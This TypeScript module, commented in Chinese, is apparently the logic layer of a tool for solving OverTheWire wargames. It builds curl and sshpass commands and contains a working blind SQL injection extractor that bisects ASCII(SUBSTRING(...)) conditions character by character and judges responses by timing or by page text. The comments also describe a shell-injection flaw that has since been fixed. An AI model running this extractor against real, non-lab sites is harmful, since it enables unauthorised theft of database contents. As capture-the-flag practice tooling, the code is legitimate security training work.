/**
 * 纯逻辑层：命令拼装 / 输出解析 / 盲注判定——**无 IO、无网络、无子进程、无时钟**。
 *
 * 从 `src/index.ts` 抽出（逐条对齐原实现），副作用（rawHttp/spawnWsl/Date.now）全部留在接线层。
 * 可离线单测：`tests/logic.test.mjs`；盲注判定用**注入的 probe 回调**驱动，因此不需要网络。
 */

import { Buffer } from 'node:buffer'

/* ── shell 单引号字面量转义 ── */

/** bash 单引号字面量转义：`'` → `'\''`。
 *  **不变量**：任何进入 `bash -c` 命令串的外来字符串都必须先过本函数，
 *  否则可闭合引号执行任意命令（本插件的命令最终由 WSL 内 bash 执行，逃逸即等于本机任意命令）。 */
export function shellQuote(s: unknown): string {
  return `'${String(s).replace(/'/g, "'\\''")}'`
}

/* ── otw_request：curl 命令拼装 + 输出解析 ── */

export interface CurlArgs {
  host: string
  user?: string
  pass?: string
  path?: string
  method?: string
  data?: string
  cookie?: string
  userAgent?: string
  resolveIp?: string
}

/** 拼装 curl 命令（经 WSL bash 执行）。
 *  已证实缺陷（修复前）：`user`/`pass`/`cookie`/`host`/`path` **未经转义**直接内插，
 *  而同函数的 `userAgent`/`data` 已做 `'\''` 转义——**半吊子防线**，闭合引号即可执行任意命令。 */
export function buildCurlCmd(args: CurlArgs): string {
  const method = (args.method ?? 'GET').toUpperCase()
  const path = args.path ?? '/'
  const resolveFlag = args.resolveIp ? `--resolve ${shellQuote(`${args.host}:80:${args.resolveIp}`)} ` : ''
  const authFlag = args.user ? `-u ${shellQuote(`${args.user}:${args.pass ?? ''}`)} ` : ''
  const cookieFlag = args.cookie ? `-b ${shellQuote(args.cookie)} ` : ''
  const uaFlag = args.userAgent ? `-A ${shellQuote(args.userAgent)} ` : ''
  const dataFlag = method === 'POST' && args.data ? `-d ${shellQuote(args.data)} ` : ''
  return `curl -s --noproxy "*" --max-time 20 ${resolveFlag}${authFlag}${cookieFlag}${uaFlag}${dataFlag}-w '\\n%{http_code}' ${shellQuote(`http://${args.host}${path}`)}`
}

/** 解析 curl 输出：最后一行是 `-w` 写入的 http_code，其余是 body。
 *  真实语义：**输出只有一行时**（无 http_code 行）status=0 且 body=整个 stdout——不抛错。 */
export function parseCurlOutput(stdout: string, maxChars = 12000): { status: number; body: string; truncated: boolean } {
  const lines = stdout.split('\n')
  const codeStr = lines.length > 1 ? (lines[lines.length - 1] ?? '').trim() : ''
  const status = Number(codeStr) || 0
  const body = lines.length > 1 ? lines.slice(0, -1).join('\n') : stdout
  const truncated = body.length > maxChars
  return { status, body: truncated ? body.slice(0, maxChars) : body, truncated }
}

/* ── otw_ssh：sshpass + ProxyCommand 命令拼装 ── */

export interface SshArgs {
  host: string
  port: number
  user: string
  pass: string
  command: string
  proxyHost: string
  proxyPort: number
}

/** 拼装 SSH 命令（经 WSL bash 执行）。
 *  `ProxyCommand=` 前缀留在引号外（与修复前逐字一致），其余外来串一律 `shellQuote`。 */
export function buildSshCmd(opts: SshArgs): string {
  const proxyCmd = `nc -X connect -x ${opts.proxyHost}:${opts.proxyPort} %h %p`
  return `sshpass -p ${shellQuote(opts.pass)} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o ProxyCommand=${shellQuote(proxyCmd)} ${shellQuote(`${opts.user}@${opts.host}`)} -p ${shellQuote(opts.port)} ${shellQuote(opts.command)}`
}

/* ── otw_blind：请求构造 ── */

/** POST 表单体：解析 `data`（`k=v&k2=v2`，键值均 decodeURIComponent）+ 覆盖注入参数。
 *  非法百分号编码会抛 `URIError`（由调用方 try/catch 收口，不静默）。
 *  真实语义：无 `=` 的段（`k` 单独出现）会以空值加入；重复键后者覆盖前者（URLSearchParams.set 语义）。 */
export function buildPostBody(data: string, injectParam: string, injectValue: string): string {
  const payload = new URLSearchParams()
  for (const pair of data.split('&')) {
    const [k, ...rest] = pair.split('=')
    if (k) payload.append(decodeURIComponent(k), decodeURIComponent(rest.join('=')))
  }
  payload.set(injectParam, injectValue)
  return payload.toString()
}

/** GET 路径：保留原 query + 覆盖注入参数 */
export function buildGetPath(url: URL, injectParam: string, injectValue: string): string {
  const sp = new URLSearchParams(url.search)
  sp.set(injectParam, injectValue)
  return url.pathname + '?' + sp.toString()
}

/** URL 内 `user:pass` → Basic auth 头（并提示调用方剥离凭据）。
 *  非法百分号编码会抛 `URIError`（不静默）。 */
export function basicAuthOf(url: URL): { authorization?: string; host: string } {
  const out: { authorization?: string; host: string } = { host: url.hostname }
  if (url.username) {
    out.authorization = 'Basic ' + Buffer.from(
      decodeURIComponent(url.username) + ':' + decodeURIComponent(url.password),
    ).toString('base64')
  }
  return out
}

/* ── otw_blind：字符集与条件构造 ── */

/** 字符集规范化：`printable`（ASCII 32-126）/ `alnum`（0-9A-Za-z）/ 其它按字面拆字符。
 *  返回**已排序**的字符数组（与原实现一致：排序在二分前发生）。 */
export function normalizeCharset(charset: string): string[] {
  if (charset === 'printable') return Array.from({ length: 95 }, (_, i) => String.fromCharCode(32 + i))
  if (charset === 'alnum') return '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('').sort()
  return charset.split('').sort()
}

/** 字符集码点边界：空集回落 `[32, 126]`（与 guard 一致，避免 `Math.min()` 得 Infinity） */
export function charsetBounds(chars: string[]): { csMin: number; csMax: number } {
  const codes = chars.map((c) => c.charCodeAt(0))
  return {
    csMin: codes.length > 0 ? Math.min(...codes) : 32,
    csMax: codes.length > 0 ? Math.max(...codes) : 126,
  }
}

/** 条件 SQL 构造。
 *  真实语义：**`like_prefix` 与 `ascii_gt` 产出完全相同**——LIKE 前缀模式实为「用 ASCII 比较
 *  规避 LIKE 通配符陷阱」（见工具描述），故三分支实际只有两种形态。 */
export function buildCond(condType: string, expr: string, pos: number, asc: number): string {
  if (condType === 'ascii_gt') return `ASCII(SUBSTRING(${expr},${pos},1)) > ${asc}`
  if (condType === 'ascii_eq') return `ASCII(SUBSTRING(${expr},${pos},1)) = ${asc}`
  return `ASCII(SUBSTRING(${expr},${pos},1)) > ${asc}`
}

/* ── otw_blind：二分提取（probe 注入，纯决策） ── */

export interface BisectOptions {
  /** 判定回调：给定条件 SQL 返回「条件为真」——由接线层实现（时间/布尔盲注 + 3 次取中位数） */
  probe: (cond: string) => Promise<boolean>
  chars: string[]
  csMin: number
  csMax: number
  maxLen: number
  condType: string
  expr: string
}

/** 二分提取：逐位确定字符，直到 `maxLen` / 越界 / 字符不在字符集内。
 *  停止条件是三条（任一命中即 break）：① 位序超过 maxLen（循环边界）；② 二分结果越出字符集边界；
 *  ③ 结果字符不在字符集内。
 *  **probe 抛错时不丢已提取部分**——返回 `{result: 已提取前缀, error}`（与原实现的
 *  「catch 里返回当前 result」语义一致：已花掉的查询不白费）。 */
export async function bisectExtract(opts: BisectOptions): Promise<{ result: string; error?: string }> {
  let result = ''
  try {
    for (let pos = 1; pos <= opts.maxLen; pos++) {
      let lo = opts.csMin - 1
      let hi = opts.csMax + 1
      while (lo + 1 < hi) {
        const mid = Math.floor((lo + hi) / 2)
        if (await opts.probe(buildCond(opts.condType, opts.expr, pos, mid))) lo = mid
        else hi = mid
      }
      if (hi < opts.csMin || hi > opts.csMax) break
      const c = String.fromCharCode(hi)
      if (!opts.chars.includes(c)) break
      result += c
    }
  } catch (e) {
    return { result, error: e instanceof Error ? e.message : String(e) }
  }
  return { result }
}

/** 盲注判定：时间模式取 3 次样本的中位数与阈值比较；布尔模式看多数样本是否含 trueText。
 *  （与网络解耦，可直接单测） */
export function judgeProbe(mode: 'time' | 'bool', samples: number[], bodies: string[], sleepThresholdMs: number, trueText: string): boolean {
  const sorted = [...samples].sort((a, b) => a - b)
  if (mode === 'time') return (sorted[1] ?? 0) > sleepThresholdMs
  const hits = bodies.filter((b) => b.includes(trueText)).length
  return hits >= 2
}

/** 时间盲注默认阈值：`max(1200, sleepSec*1000*0.6)`（SLEEP 的 60%，留网络抖动余量） */
export function defaultSleepThresholdMs(sleepSec: number): number {
  return Math.max(1200, sleepSec * 1000 * 0.6)
}
